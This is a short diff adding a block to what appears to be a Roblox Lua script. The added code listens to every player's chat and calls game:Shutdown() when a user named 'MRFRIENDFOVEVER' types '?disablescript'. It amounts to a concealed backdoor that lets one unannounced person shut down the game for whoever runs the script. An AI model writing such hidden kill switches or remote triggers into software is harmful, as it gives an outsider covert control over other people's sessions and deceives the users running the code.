@@ -4266,6 +4266,21 @@ spawn(function()
 	end
 end)
 
+--shutdowngame
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?disablescript" then
+        print("Kicked All")
+                game:Shutdown()
+        end
+    end
+  end)
+end
+
 --CopyTeam
 local Action = game.Players:GetPlayers()
 local gameplayer = game.Players.LocalPlayer
